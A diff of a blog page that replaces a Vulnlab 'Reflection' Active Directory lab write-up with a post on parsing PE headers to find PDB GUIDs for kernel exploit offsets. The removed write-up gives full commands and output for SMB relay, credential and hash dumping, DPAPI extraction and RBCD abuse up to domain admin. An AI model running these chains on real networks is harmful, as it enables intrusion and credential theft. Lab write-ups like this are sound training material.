@@ -9,34 +9,33 @@
     <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
-    <title>Reflection</title>
-    <meta name="title" content="Reflection">
-    <meta name="description" content="IPs: 10.10.177.149 10.10.177.150 10.10.177.151">
+    <title>Parsing PE Headers</title>
+    <meta name="title" content="Parsing PE Headers">
+    <meta name="description" content="This was going to be one post but it got kinda long so here is part one. I'm getting really annoyed of having to look up offsets and recompile driver...">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://eljayright.github.io/writeups/vulnlab/reflection/">
+    <link rel="canonical" href="https://eljayright.github.io/research/parsing_pe_headers/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://eljayright.github.io/writeups/vulnlab/reflection/">
-    <meta property="og:title" content="Reflection">
-    <meta property="og:description" content="IPs: 10.10.177.149 10.10.177.150 10.10.177.151">
-    <meta property="og:image" content="https://eljayright.github.io/writeups/vulnlab/reflection/images/reflection.png">
+    <meta property="og:url" content="https://eljayright.github.io/research/parsing_pe_headers/">
+    <meta property="og:title" content="Parsing PE Headers">
+    <meta property="og:description" content="This was going to be one post but it got kinda long so here is part one. I'm getting really annoyed of having to look up offsets and recompile driver...">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://eljayright.github.io/writeups/vulnlab/reflection/">
-    <meta property="twitter:title" content="Reflection">
-    <meta property="twitter:description" content="IPs: 10.10.177.149 10.10.177.150 10.10.177.151">
-    <meta property="twitter:image" content="https://eljayright.github.io/writeups/vulnlab/reflection/images/reflection.png">
+    <meta property="twitter:url" content="https://eljayright.github.io/research/parsing_pe_headers/">
+    <meta property="twitter:title" content="Parsing PE Headers">
+    <meta property="twitter:description" content="This was going to be one post but it got kinda long so here is part one. I'm getting really annoyed of having to look up offsets and recompile driver...">
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../resources/css/retype.css?v=3.11.0.808915000945" rel="stylesheet">
+    <link href="../../resources/css/retype.css?v=3.11.0.808915000945" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.11.0.808915000945" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.11.0.808915000945" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/config.js?v=3.11.0.808915000945" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.11.0.808915000945" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.11.0.808915000945" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -51,7 +50,7 @@
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="retype-branding-logo" href="../../../" class="flex items-center leading-snug text-2xl">
+                        <a id="retype-branding-logo" href="../../" class="flex items-center leading-snug text-2xl">
                             <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">ElJayRight</span>
                         </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">dev-notes</span>
                     </div>
@@ -179,230 +178,273 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="reflection" class="break-words">
+<doc-anchor-target id="parsing-pe-headers" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#reflection">#</doc-anchor-trigger>
-        <span>Reflection</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#parsing-pe-headers">#</doc-anchor-trigger>
+        <span>Parsing PE Headers</span>
     </h1>
 </doc-anchor-target>
-<p><figure class="content-center">
-    <img src="images/reflection.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>IPs: <code v-pre>10.10.177.149</code> <code v-pre>10.10.177.150</code> <code v-pre>10.10.177.151</code></p>
-<doc-anchor-target id="recon">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#recon">#</doc-anchor-trigger>
-        <span>Recon</span>
-    </h1>
+<doc-anchor-target id="outline">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#outline">#</doc-anchor-trigger>
+        <span>Outline</span>
+    </h2>
 </doc-anchor-target>
-<p>Nmap:</p>
-<p>10.10.177.149 dc01.reflection.vl</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">53/tcp   open  domain        Simple DNS Plus
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-10 09:46:33Z)
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
-445/tcp  open  microsoft-ds?
-464/tcp  open  kpasswd5?
-593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped
-1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
-</doc-codeblock></div>
-<p>10.10.177.150 ms01.reflection.vl</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">135/tcp  open  msrpc         Microsoft Windows RPC
-445/tcp  open  microsoft-ds?
-1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
-</doc-codeblock></div>
-<p>10.10.177.151 ws01.reflection.vl</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">135/tcp  open  msrpc         Microsoft Windows RPC
-445/tcp  open  microsoft-ds?
-3389/tcp open  ms-wbt-server Microsoft Terminal Services</code></pre>
-</doc-codeblock></div>
-<p>smb:
-Anonymous bind</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">nxc smb 10.10.177.149-199 -u 'anonymous' -p 'anonymous' --shares
-SMB         10.10.177.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
-SMB         10.10.177.151   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
-SMB         10.10.177.150   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
-SMB         10.10.177.149   445    DC01             [-] reflection.vl\anonymous:anonymous STATUS_LOGON_FAILURE 
-SMB         10.10.177.151   445    WS01             [-] reflection.vl\anonymous:anonymous STATUS_LOGON_FAILURE 
-SMB         10.10.177.150   445    MS01             [+] reflection.vl\anonymous:anonymous 
-SMB         10.10.177.150   445    MS01             [*] Enumerated shares
-SMB         10.10.177.150   445    MS01             Share           Permissions     Remark
-SMB         10.10.177.150   445    MS01             -----           -----------     ------
-SMB         10.10.177.150   445    MS01             ADMIN$                          Remote Admin
-SMB         10.10.177.150   445    MS01             C$                              Default share
-SMB         10.10.177.150   445    MS01             IPC$            READ            Remote IPC
-SMB         10.10.177.150   445    MS01             staging         READ            staging environment</code></pre>
-</doc-codeblock></div>
-<p>checking the staging share, there are creds for the mssql db:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">user=web_staging
-password=Washroom510
-db=staging</code></pre>
-</doc-codeblock></div>
-<p>Logging in with the user, we dont have the ability to impersonate or xp_cmdshell, as smb signing is disabled we should be able to relay to places.</p>
-<p>Running <code v-pre>xpdir_tree</code> in mssqlclient and then catching it in responder shows 2 things:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">[SMB] NTLMv2-SSP Client   : 10.10.177.150
-[SMB] NTLMv2-SSP Username : REFLECTION\svc_web_staging
-[SMB] NTLMv2-SSP Hash     : svc_web_staging::REFLECTION:15f0593c1d3e15a3:E20865924AA729B060D953D096E61414:010100000000000080AF91C3501BDB01E2999F166B10C13400000000020008004800420038004C0001001E00570049004E002D00360053004C003100470034004B00540057004600500004003400570049004E002D00360053004C003100470034004B0054005700460050002E004800420038004C002E004C004F00430041004C00030014004800420038004C002E004C004F00430041004C00050014004800420038004C002E004C004F00430041004C000700080080AF91C3501BDB0106000400020000000800300030000000000000000000000000300000165D8EFF0AF926E7CD16AE28D1A3FF0664104D936B01545B71C8363950E6B40C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0030002E003100310030000000000000000000</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="smb-relay">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#smb-relay">#</doc-anchor-trigger>
-        <span>SMB Relay</span>
-    </h1>
+<p><em>This was going to be one post but it got kinda long so here is part one.</em>
+I&#x27;m getting really annoyed of having to look up offsets and recompile driver exploits for different OS&#x27;s and thought surely there is a way that this can be done automagically at execution time. My first thought was &quot;well if windbg knows the size of a structure then why cant i?&quot; (Parsing the actual PDB will be in part 2)</p>
+<doc-anchor-target id="windbg-and-pdb-files">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#windbg-and-pdb-files">#</doc-anchor-trigger>
+        <span>Windbg and PDB files</span>
+    </h2>
 </doc-anchor-target>
-<p>The mssql server is running as a domain user, and its a ntlmv2 hash. We can relay this to smb on the other boxes using ntlmrelayx:</p>
+<p>How i normally go about finding offsets is by creating a VM with the same major version of the OS i am targeting (for all the code snippets it will be Windows 11 24H2.), hooking up a debugger and dumping the structure:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">$ ntlmrelayx.py -t ws01 -smb2support -i
-Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
-... snip ...
-[*] Protocol Client SMB loaded..</code></pre>
+<pre translate="no" class="language-c"><code v-pre class="language-c">0: kd&gt; dt nt!_Token TokenFlags Capabilities
+   +0x0c8 TokenFlags   : Uint4B
+   +0x318 Capabilities : Ptr64 _SID_AND_ATTRIBUTES</code></pre>
 </doc-codeblock></div>
-<p>Then when running <code v-pre>xp_dirtree</code> again we get a smb shell on a local port:</p>
+<p>Then hard coding it in for the exploit:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.177.150, attacking target smb://ws01
-[*] Authenticating against smb://ws01 as REFLECTION/SVC_WEB_STAGING SUCCEED
-[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000</code></pre>
+<pre translate="no" class="language-c"><code v-pre class="language-c">#define TokenFlags 0x0c8</code></pre>
 </doc-codeblock></div>
-<p>There was nothing on the ws01, doing the same thing for dc01.</p>
+<p>While this works it absolutely sucks to do every single time. So instead I started to look into how windbg knows which Program DataBase (PDB) to pull from microsoft and use within windbg. Quickly dumping out the headers showed that the pdb string is represented as a GUID within the debug directories of the files (This wont be the case for all PEs as some dont have public symbols).</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none"># shares
-ADMIN$
-C$
-IPC$
-NETLOGON
-prod
-SYSVOL
-# use prod
-# ls
-drw-rw-rw-          0  Thu Jun  8 03:44:26 2023 .
-drw-rw-rw-          0  Thu Jun  8 03:43:22 2023 ..
--rw-rw-rw-         45  Thu Jun  8 21:24:39 2023 prod_db.conf
-# get prod_db.conf</code></pre>
+<pre translate="no" class="language-json"><code v-pre class="language-json">dumpbin /headers ntoskrnl.exe
+...
+  Debug Directories
+
+        Time Type        Size      RVA  Pointer
+    -------- ------- -------- -------- --------
+    BCA5A8DD cv            25 000410C0    408C0    Format: RSDS, {B6121DA1-5DDC-F625-C8C7-273C0D85EB10}, 1, ntkrnlmp.pdb
+    BCA5A8DD coffgrp     1574 000410E8    408E8    50475500 (PGU)
+    BCA5A8DD repro         24 000426DC    41EDC    A1 1D 12 B6 DC 5D 25 F6 C8 C7 27 3C 0D 85 EB 10 C8 8B E5 B6 CF 5D FD EC EE 8E 7C 5F DD A8 A5 BC</code></pre>
 </doc-codeblock></div>
-<p>Again providing more creds:</p>
+<p>I dont know what the other 2 are so im going to forget about them and just focus on the cv one.</p>
+<p>You can also do this in windbg:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">user=web_prod
-password=Tribesman201
-db=prod</code></pre>
+<pre translate="no" class="language-c"><code v-pre class="language-c">0: kd&gt; !lmi nt
+Loaded Module Info: [nt] 
+         Module: ntkrnlmp
+   Base Address: fffff801d3260000
+     Image Name: ntkrnlmp.exe
+   Machine Type: 34404 (X64)
+     Time Stamp: 93dad125 (This``` is a reproducible build file hash, not a true timestamp)
+           Size: 1450000
+       CheckSum: c64ecc
+Characteristics: 22  
+Debug Data Dirs: Type  Size     VA  Pointer
+             CODEVIEW    25, 589f0,   589f0 RSDS - GUID: {91F95759-B8A1-C35A-0A97-73FCA2A8A67E}
+               Age: 1, Pdb: ntkrnlmp.pdb
+                 POGO   920, 58a18,   58a18 [Data not mapped]
+                REPRO    24, 593b8,   593b8 Reproducible build
+           DLLCHAR_EX     4, 593dc,   593dc Extended DLL characteristics: 00000081
+                                                 CET compatible
+                                                 (Unknown)
+     Image Type: MEMORY   - Image read successfully from loaded memory.
+    Symbol Type: PDB      - Symbols loaded successfully from image header.
+                 C:\ProgramData\Dbg\sym\ntkrnlmp.pdb\91F95759B8A1C35A0A9773FCA2A8A67E1\ntkrnlmp.pdb</code></pre>
 </doc-codeblock></div>
-<p>Logging into the db on the domain controller gives us domain creds!</p>
+<p>Once you have the GUID and the pdb filename you can download the file from microsofts symbols store:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">SQL (web_prod  dbo@prod)&gt; select * from users;
-id   name              password            
---   ---------------   -----------------   
- 1   b'abbie.smith'    b'CMe1x+nlRaaWEw'   
- 2   b'dorothy.rose'   b'hC_fny3OK9glSJ'</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">https://msdl.microsoft.com/download/symbols/{filename}/{guid}{age}/{filename}</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="bloodhound-analysis">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#bloodhound-analysis">#</doc-anchor-trigger>
-        <span>Bloodhound analysis</span>
-    </h1>
+<doc-anchor-target id="pe-headers">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#pe-headers">#</doc-anchor-trigger>
+        <span>PE Headers</span>
+    </h2>
 </doc-anchor-target>
-<p>Now with domain creds, we can finally run bloodhound:</p>
+<p>While this is cool ideally i want to be able to do this with just a file handle so i can later turn it into a Beacon Object File (BOF). Which finally lead me to the PE headers. After reading <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format">https://learn.microsoft.com/en-us/windows/win32/debug/pe-format</a> a few times and reading a few other posts we need to read the DOS header which will have a pointer to the NT headers. The NT headers will have section headers and then we can finally read out the debug directory entries.</p>
+<p>We can check if the DOS header and NT header are valid before hand too.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">./bloodhound.py -d reflection.vl -u abbie.smith -p CMe1x+nlRaaWEw -c all -ns 10.10.177.149 --zip -dc dc01.reflection.vl</code></pre>
+<pre translate="no" class="language-c"><code v-pre class="language-c">IMAGE_DOS_HEADER dos_header = { 0 };
+fread(&amp;dos_header, 1, sizeof(dos_header), fp);
+if (dos_header.e_magic != 0x5a4d){ // MZ printf(&quot;Not a valid PE file\n&quot;); fclose(fp);
+		return 1;
+}
+
+fseek(fp, dos_header.e_lfanew, SEEK_SET);
+
+IMAGE_NT_HEADERS64 nt_header = { 0 };
+fread(&amp;nt_header, 1, sizeof(nt_header), fp);
+if (nt_header.Signature != 0x00004550){ // PE\0\0
+		printf(&quot;Bad PE signature\n&quot;);
+		fclose(fp);
+		return 1;
+}</code></pre>
 </doc-codeblock></div>
-<p>The abbie smith user has generic all over the ms01 box, which also has LAPS. With this we can get admin on the machine.</p>
+<p>Next is to read the section headers and get the debug directory entries.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">nxc ldap dc01 -u abbie.smith -p CMe1x+nlRaaWEw -M laps
-SMB         10.10.177.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
-LDAP        10.10.177.149   389    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw 
-LAPS        10.10.177.149   389    DC01             [*] Getting LAPS Passwords
-LAPS        10.10.177.149   389    DC01             Computer:MS01$ User:                Password:H447.++h6g5}xi</code></pre>
+<pre translate="no" class="language-c"><code v-pre class="language-c">long rva_to_offset(DWORD rva, IMAGE_SECTION_HEADER *sections, int nsects) {
+    for (int i = 0; i &lt; nsects; i++) {
+        DWORD va = sections[i].VirtualAddress;
+        DWORD sz = sections[i].SizeOfRawData;
+        if (rva &gt;= va &amp;&amp; rva &lt; va + sz) {
+            return (rva - va) + sections[i].PointerToRawData;
+        }
+    }
+    return -1; // not found
+}
+
+int nt_sections = nt_header.FileHeader.NumberOfSections;
+
+IMAGE_SECTION_HEADER *sections = calloc(nt_sections, sizeof(IMAGE_SECTION_HEADER));
+fread(sections, sizeof(IMAGE_SECTION_HEADER), nt_sections, fp);
+
+IMAGE_DATA_DIRECTORY debug_directory_info = nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
+
+if (debug_directory_info.VirtualAddress == 0 || debug_directory_info.Size == 0) {
+		printf(&quot;No debug directories found.\n&quot;);
+		free(sections);
+		fclose(fp);
+		return 0;
+}
+
+long debug_directory_offset = rva_to_offset(debug_directory_info.VirtualAddress, sections, nt_sections);
+int count = debug_directory_info.Size / sizeof(IMAGE_DEBUG_DIRECTORY);
+
+printf(&quot;Debug Directory: RVA=0x%x Size=%u -&gt; offset=0x%lx (%d entries)\n&quot;, debug_directory_info.VirtualAddress, debug_directory_info.Size, debug_directory_offset, count);
+
+fseek(fp, debug_directory_offset, SEEK_SET);
+for (int i = 0; i &lt; count; i++) {
+	IMAGE_DEBUG_DIRECTORY dir = {0};
+	fread(&amp;dir, sizeof(dir), 1, fp);
+
+	printf(&quot;Entry %d:\n&quot;, i);
+	printf(&quot;  TimeDateStamp     : 0x%08x\n&quot;, dir.TimeDateStamp);
+	printf(&quot;  MajorVersion      : %u\n&quot;, dir.MajorVersion);
+	printf(&quot;  MinorVersion      : %u\n&quot;, dir.MinorVersion);
+	printf(&quot;  Type              : %u\n&quot;, dir.Type);
+	printf(&quot;  SizeOfData        : %u\n&quot;, dir.SizeOfData);
+	printf(&quot;  AddressOfRawData  : 0x%08x\n&quot;, dir.AddressOfRawData);
+	printf(&quot;  PointerToRawData  : 0x%08x\n&quot;, dir.PointerToRawData);
+}</code></pre>
 </doc-codeblock></div>
-<p>The georgia.price user has generic all over ws01, if we get access to this user account we can configure rbcd and login as admin.</p>
-<p>dom_rgarner is also a domain admin.</p>
-<doc-anchor-target id="ms01-to-ws01-lateral-movement">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#ms01-to-ws01-lateral-movement">#</doc-anchor-trigger>
-        <span>MS01 to WS01 lateral movement</span>
-    </h1>
-</doc-anchor-target>
-<p>running secretsdump with the laps account shows</p>
+<p>Running the above against ntoskrnl shows the exact same thing as dumpbin.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">secretsdump.py administrator@ms01
-Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
-
-Password:
-[*] Service RemoteRegistry is in stopped state
-[*] Starting service RemoteRegistry
-[*] Target system bootKey: 0xf0093534e5f21601f5f509571855eeee
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-REFLECTION\MS01$:aad3b435b51404eeaad3b435b51404ee:52fe679e706ae506edb8d19608e967f0:::
-REFLECTION.VL/Georgia.Price:$DCC2$10240#Georgia.Price#f20a83b9452ce1c17cf4a57c2b05f7ec: (2024-10-13 07:15:59)
-REFLECTION\svc_web_staging:DivinelyPacifism98</code></pre>
+<pre translate="no" class="language-python"><code v-pre class="language-python">./get_pdb ntoskrnl.exe 
+Debug Directory: RVA=0x42110 Size=112 -&gt; offset=0x42110 (4 entries)
+Entry 0:
+  TimeDateStamp     : 0x93dad125
+  MajorVersion      : 0
+  MinorVersion      : 0
+  Type              : 2
+  SizeOfData        : 37
+  AddressOfRawData  : 0x000589f0
+  PointerToRawData  : 0x000589f0
+Entry 1:
+  TimeDateStamp     : 0x93dad125
+  MajorVersion      : 0
+  MinorVersion      : 0
+  Type              : 13
+  SizeOfData        : 2336
+  AddressOfRawData  : 0x00058a18
+  PointerToRawData  : 0x00058a18
+Entry 2:
+  TimeDateStamp     : 0x93dad125
+  MajorVersion      : 0
+  MinorVersion      : 0
+  Type              : 16
+  SizeOfData        : 36
+  AddressOfRawData  : 0x000593b8
+  PointerToRawData  : 0x000593b8
+Entry 3:
+  TimeDateStamp     : 0x93dad125
+  MajorVersion      : 0
+  MinorVersion      : 0
+  Type              : 20
+  SizeOfData        : 4
+  AddressOfRawData  : 0x000593dc
+  PointerToRawData  : 0x000593dc</code></pre>
 </doc-codeblock></div>
-<p>Cached credentials for georgia.price and cleartext pwd for the web service account.</p>
-<p>I&#x27;m going to upload and run sharpdpapi to see if the credentials are stored within dpapi on the machine.</p>
+<p>Finally we can check if the debug type (<a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#debug-type">https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#debug-type</a>) and then dump out the buffer which should be the pdb and follow this structure. (<a href="https://www.debuginfo.com/articles/debuginfomatch.html">https://www.debuginfo.com/articles/debuginfomatch.html</a>)</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">*Evil-WinRM* PS C:\Windows\Tasks&gt; .\SharpDPAPI.exe machinetriage
-UserName         : REFLECTION\Georgia.Price 
-Credential       : DBl+5MPkpJg5id </code></pre>
+<pre translate="no" class="language-c"><code v-pre class="language-c">struct CV_INFO_PDB70
+{
+  DWORD  CvSignature;
+  GUID Signature;
+  DWORD Age;
+  BYTE PdbFileName[];
+};</code></pre>
 </doc-codeblock></div>
-<p>nice! now for rbcd:</p>
+<p>We can also check if the signature matches &quot;RSDS&quot;.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">pypykatz crypto nt DBl+5MPkpJg5id
-cecba8eb22763fef03c86a53fa4a09e2
+<pre translate="no" class="language-c"><code v-pre class="language-c">if (dir.Type == 2){
+...
+	void *buf = malloc(dir.SizeOfData);
 
-rbcd.py reflection.vl/Georgia.Price -hashes :cecba8eb22763fef03c86a53fa4a09e2 -delegate-to ws01\$ -delegate-from ms01\$ -action write 
-Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+	//CV_INFO_PDB70 cv_info_obj = { 0 };
+	fseek(fp, dir.PointerToRawData, SEEK_SET);
+	fread(buf, 1, dir.SizeOfData, fp);
 
-[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
-[*] Delegation rights modified successfully!
-[*] ms01$ can now impersonate users on ws01$ via S4U2Proxy
-[*] Accounts allowed to act on behalf of other identity:
-[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
+	CV_INFO_PDB70 *cv_info_obj = (CV_INFO_PDB70 *)buf;
+	//fread(&amp;cv_info_obj, sizeof(cv_info_obj), 1, fp);
 
-
-getST.py -spn 'cifs/ws01' -impersonate administrator -dc-ip dc01.reflection.vl -hashes :52fe679e706ae506edb8d19608e967f0 reflection.vl/'ms01$'
-Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
-
-[-] CCache file is not found. Skipping...
-[*] Getting TGT for user
-[*] Impersonating administrator
-[*] Requesting S4U2self
-[*] Requesting S4U2Proxy
-[*] Saving ticket in administrator@cifs_ws01@REFLECTION.VL.ccache</code></pre>
+	if ( cv_info_obj-&gt;CvSignature != 0x53445352){
+			printf(&quot;Not a valid PDB7 signature\n&quot;);
+			return 1;
+	}
+	printf(&quot;Valid CodeView (RSDS) record found\n&quot;);
+	printf(&quot;  GUID: %08x-%04x-%04x-%02x-%02x\n&quot;,
+			   cv_info_obj-&gt;Signature.Data1,
+			   cv_info_obj-&gt;Signature.Data2,
+			   cv_info_obj-&gt;Signature.Data3);
+	for (int i = 0; i &lt; 2; i++) printf(&quot;%02x&quot;, cv_info_obj-&gt;Signature.Data4[i]);
+	printf(&quot;-&quot;);
+	for (int i = 2; i &lt; 8; i++) printf(&quot;%02x&quot;, cv_info_obj-&gt;Signature.Data4[i]);
+	printf(&quot;\n&quot;);
+	printf(&quot;  Age: %u\n&quot;, cv_info_obj-&gt;Age);
+	printf(&quot;  PDB: %s\n&quot;, cv_info_obj-&gt;PdbFileName);</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="domain-admin">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#domain-admin">#</doc-anchor-trigger>
-        <span>Domain Admin</span>
-    </h1>
-</doc-anchor-target>
-<p>Going to secrets dump the ws01 box with the hopes of finding more cached credentials:</p>
+<p>which results in:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">KRB5CCNAME=$(pwd)/administrator\@cifs_ws01\@REFLECTION.VL.ccache secretsdump.py administrator@ws01 -k -no-pass
-
-REFLECTION.VL/Rhys.Garner:$DCC2$10240#Rhys.Garner#99152b74dac4cc4b9763240eaa4c0e3d: (2023-06-08 11:17:05)
-[*] DefaultPassword 
-reflection.vl\Rhys.Garner:knh1gJ8Xmeq+uP
-</code></pre>
+<pre translate="no" class="language-python"><code v-pre class="language-python">Debug Directory: RVA=0x42110 Size=112 -&gt; offset=0x42110 (4 entries)
+Entry 0:
+  TimeDateStamp     : 0x93dad125
+  MajorVersion      : 0
+  MinorVersion      : 0
+  Type              : 2
+  SizeOfData        : 37
+  AddressOfRawData  : 0x000589f0
+  PointerToRawData  : 0x000589f0
+Valid CodeView (RSDS) record found
+  GUID: 91f95759-b8a1-c35a-0a97-73fca2a8a67e
+  Age: 1
+  PDB: ntkrnlmp.pdb</code></pre>
 </doc-codeblock></div>
-<p>This account looks like the low priv version of the domain admins account. Let&#x27;s hope for pwd reuse:</p>
+<p>: D</p>
+<p>Final step is to download the file and check the checksum against the one that windbg uses.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">nxc ldap dc01 -u dom_rgarner -p knh1gJ8Xmeq+uP
-SMB         10.10.146.181   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
-LDAP        10.10.146.181   389    DC01             [+] reflection.vl\dom_rgarner:knh1gJ8Xmeq+uP (Pwn3d!)</code></pre>
+<pre translate="no" class="language-python"><code v-pre class="language-python">$ wget https://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/91f95759b8a1c35a0a9773fca2a8a67e1/ntkrnlmp.pdb
+$ sha256sum ntkrnlmp.pdb 
+72c26e96cf9a147b8f460faf7803f1787b5a81ff6634aec1252556c585aca161  ntkrnlmp.pdb
+---
+PS &gt; Get-FileHash C:\ProgramData\Dbg\sym\ntkrnlmp.pdb\91F95759B8A1C35A0A9773FCA2A8A67E1\ntkrnlmp.pdb
+
+Algorithm       Hash                                                                   Path
+---------       ----                                                                   ----
+SHA256          72C26E96CF9A147B8F460FAF7803F1787B5A81FF6634AEC1252556C585ACA161       C:\ProgramData\Dbg\sym\ntkrnl...</code></pre>
 </doc-codeblock></div>
 <p>TaDa!</p>
+<doc-anchor-target id="closing-thoughts">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#closing-thoughts">#</doc-anchor-trigger>
+        <span>Closing Thoughts</span>
